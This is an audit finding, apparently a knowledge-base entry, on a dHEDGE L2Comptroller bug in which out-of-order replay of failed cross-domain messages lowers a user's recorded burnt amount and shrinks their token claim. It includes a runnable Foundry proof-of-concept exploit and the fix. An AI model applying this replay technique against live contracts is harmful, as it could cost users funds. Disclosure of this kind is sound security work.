---
tags:
  - lang/solidity
  - platform/zachobront
  - has/github
  - has/poc
  - severity/high
  - novelty/variant
  - sector/oracle
protocol: "[[Dhedge]]"
auditors:
  - "[[Zach Obront]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-06-01-Dhedge.md"
genome:
  - "[[replay]]"
  - "[[direct-drain]]"
  - "[[bridge-message-validation]]"
  - "[[cross-contract-state-consistency]]"
---
# [H-01] User can receive too few tokens when L2Comptroller is unpaused

- id: 18772
- impact: HIGH
- protocol: [[Dhedge]]
- reporter: Zach Obront (ZachObront)
- source: https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-06-01-Dhedge.md

## Summary


This bug report is about an issue in the Bedrock system where a malicious user can perform a call to the Cross Domain Messenger to replay old transactions in the wrong order, resulting in a user only receiving a fraction of the tokens they are entitled to. 

This occurs when the `L2Comptroller` contract is in a paused state and two deposit transactions are called in the wrong order. The first has `totalBurntAmount = X`, while the second has `totalBurntAmount = X + N`, where `N` is the amount of MTA deposited in the second transaction. When `buyBackFromL1()` is called, the function is expected to set `l1BurntAmountOf` to the new value, try to call `this._buyBack()` to transfer the tokens, and not update `claimedAmountOf` if there are no tokens to transfer. 

However, the two transactions can be called in the wrong order, resulting in `l1BurntAmountOf` being set to `X`, instead of the expected `X + N`. When the user calls `claim()` or `claimAll()`, they will only receive `X` tokens, instead of the `X + N` they are entitled to.

To fix this issue, dHEDGE has recommended adding a check in `buyBackFromL1()` to ensure that `l1BurntAmountOf` is monotonically increasing. This fix was implemented in pull request #17.

## Details

When MTA tokens are burned on L1 to generate MTy tokens on L2, the message is passed using Optimism's Cross Domain Messenger contract.

If the ultimate call to `buyBackFromL1()` fails, the Cross Domain Messenger contains functionality to set the message as `failed` so it can be replayed:

```solidity
xDomainMsgSender = _sender;
bool success = SafeCall.callWithMinGas(_target, _minGasLimit, _value, _message);
xDomainMsgSender = Constants.DEFAULT_L2_SENDER;

if (success) {
successfulMessages[versionedHash] = true;
emit RelayedMessage(versionedHash);
} else {
failedMessages[versionedHash] = true;
emit FailedRelayedMessage(versionedHash);
}
```

This `failed` state would occur in any situation where the call to `buyBackFromL1()` reverts. One example of such a situation would be if the `L2Comptroller` contract is in a paused state.

We can imagine that, in such a state, a user makes two deposit transactions. The first has `totalBurntAmount = X`, while the second has `totalBurntAmount = X + N`, where `N` is the amount of MTA deposited in the second transaction.

Later, the `L2Comptroller` contract is unpaused. But, at some point (either immediately or later) it runs out of MTy tokens to distribute.

When `buyBackFromL1()` is called, the function is expected to:

- set `l1BurntAmountOf` to the new value
- try to call `this._buyBack()` to transfer the tokens
- since there are no tokens to transfer, do not update `claimedAmountOf`

The problem is that the two transactions can be called in the wrong order. Because there is no check that `l1BurntAmountOf` is monotonically increasing, the second transaction will overwrite the `l1BurntAmountOf` of the first:

```solidity
// `totalAmountClaimed` is of the `tokenToBurn` denomination.
uint256 totalAmountClaimed = claimedAmountOf[l1Depositor];

// The cumulative token amount burnt and claimed against on L2 should never be less than
// what's been burnt on L1. This indicates some serious issues.
assert(totalAmountClaimed <= totalAmountBurntOnL1);

// The difference of both these variables tell us the claimable token amount in `tokenToBurn`
// denomination.
uint256 burnTokenAmount = totalAmountBurntOnL1 - totalAmountClaimed;

if (burnTokenAmount == 0) {
revert ExceedingClaimableAmount(l1Depositor, 0, 0);
}

// Store the new total amount of tokens burnt on L1 and claimed against on L2.
l1BurntAmountOf[l1Depositor] = totalAmountBurntOnL1;
```

The last time it was claimed was before these two transactions, so `totalAmountClaimed < X`, and all checks pass. When the second transaction is called, `l1BurntAmountOf` is set to `X + N`. Then, when the first transaction is called, `l1BurntAmountOf` is set to `X`.

In the Bedrock system, this call to the Cross Domain Messenger to replay old transactions in the wrong order can be performed by anyone, so a malicious user could perform this action on behalf of our innocent user.

The result is that, when the user calls `claim()` or `claimAll()`, they will only receive `X` tokens, instead of the `X + N` they are entitled to.

**Proof of Concept**

Here is a test that can be dropped into the repo to reproduce this behavior. You can run it with `forge test -vvv --match-test testOutOfSyncBrickedFunds`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/L1Comptroller.sol";
import "src/L2Comptroller.sol";
import {IERC20Burnable} from "../src/interfaces/IERC20Burnable.sol";
import {ICrossDomainMessenger} from "../src/interfaces/ICrossDomainMessenger.sol";
import {IPoolLogic} from "../src/interfaces/IPoolLogic.sol";
import {IERC20Upgradeable} from "@openzeppelin/contracts-upgradeable/interfaces/IERC20Upgradeable.sol";

library AddressAliasHelper {
uint160 constant offset = uint160(0x1111000000000000000000000000000000001111);

function applyL1ToL2Alias(address l1Address) internal pure returns (address l2Address) {
unchecked {
l2Address = address(uint160(l1Address) + offset);
}
}
}

interface IMTy is IERC20Upgradeable {
function totalSupply() external view returns (uint);
}

contract OutofSyncBrickedFundsTest is Test {
L2Comptroller l2c = L2Comptroller(0x3509816328cf50Fed7631c2F5C9a18c75cd601F0);
ICrossDomainMessenger l2xdm = ICrossDomainMessenger(0x4200000000000000000000000000000000000007);
IMTy mty = IMTy(0x0F6eAe52ae1f94Bc759ed72B201A2fDb14891485);

function testOutOfSyncBrickedFunds() public {
vm.createSelectFork("INSERT_RPC_URL");

// simulate a situation where L2Comptroller has no funds & is paused
address user = makeAddr("user");
uint bal = mty.balanceOf(address(l2c));
vm.prank(address(l2c));
mty.transfer(address(1), bal);
address owner = l2c.owner();
vm.prank(owner);
l2c.pause();

// send two txs, one for 1e18 totalBurned and one for 2e18 totalBurned
address aliasedXDM = AddressAliasHelper.applyL1ToL2Alias(l2xdm.l1CrossDomainMessenger());
uint nonce100 = uint(keccak256(abi.encode("nonce100")));
uint nonce200 = uint(keccak256(abi.encode("nonce200")));

vm.startPrank(aliasedXDM);
l2xdm.relayMessage(
0x3509816328cf50Fed7631c2F5C9a18c75cd601F0, // L1Comptroller
0x3509816328cf50Fed7631c2F5C9a18c75cd601F0, // L2Comptroller
abi.encodeWithSignature(
"buyBackFromL1(address,address,uint256)",
user,
user,
1e18
),
nonce100
);
l2xdm.relayMessage(
0x3509816328cf50Fed7631c2F5C9a18c75cd601F0, // L1Comptroller
0x3509816328cf50Fed7631c2F5C9a18c75cd601F0, // L2Comptroller
abi.encodeWithSignature(
"buyBackFromL1(address,address,uint256)",
user,
user,
2e18
),
nonce200
);
vm.stopPrank();

// unpause the L2Comp contract
vm.prank(owner);
l2c.unpause();

// execute the 2e18 transaction first, and then the 1e18 transaction
// in bedrock, anyone can call this, but on old OP system we need to prank aliased XDM
// these will be saved as unclaimed on contract because there are no funds to pay
vm.startPrank(aliasedXDM);
l2xdm.relayMessage(
0x3509816328cf50Fed7631c2F5C9a18c75cd601F0, // L1Comptroller
0x3509816328cf50Fed7631c2F5C9a18c75cd601F0, // L2Comptroller
abi.encodeWithSignature(
"buyBackFromL1(address,address,uint256)",
user,
user,
2e18
),
nonce200
);
l2xdm.relayMessage(
0x3509816328cf50Fed7631c2F5C9a18c75cd601F0, // L1Comptroller
0x3509816328cf50Fed7631c2F5C9a18c75cd601F0, // L2Comptroller
abi.encodeWithSignature(
"buyBackFromL1(address,address,uint256)",
user,
user,
1e18
),
nonce100
);
vm.stopPrank();

// add funds to the contract
deal(address(mty), address(l2c), 10e18);

// user calls claimAll
vm.prank(user);
l2c.claimAll(user);

// even though the user should have 2e18 worth of MTy tokens
// they actually only have ~1e18 worth
// their `l1BurntAmountOf` is 1e18 as well
assertApproxEqAbs(l2c.convertToTokenToBurn(mty.balanceOf(user)), 1e18, 100);
assertEq(l2c.l1BurntAmountOf(user), 1e18);
}
}
```

**Recommendation**

Add a check in `buyBackFromL1()` to ensure that `l1BurntAmountOf` is monotonically increasing:

```diff
function buyBackFromL1(
address l1Depositor,
address receiver,
uint256 totalAmountBurntOnL1
) external whenNotPaused {
...
+   if (totalAmountBurntOnL1 < l1BurntAmountOf[l1Depositor]) {
+      revert DecreasingBurntAmount;
+   }
l1BurntAmountOf[l1Depositor] = totalAmountBurntOnL1;
...
}
```

**dHEDGE Response**

We were unaware of the fact that the Cross Domain Messenger contains functionality to set the message as `failed` so it can be replayed. We will take the necessary step of adding a check in `buyBackFromL1()` to ensure that `l1BurntAmountOf` is monotonically increasing.

**Review**

Fixed in [PR #17](https://github.com/dhedge/buyback-contract/pull/17/) as recommended.
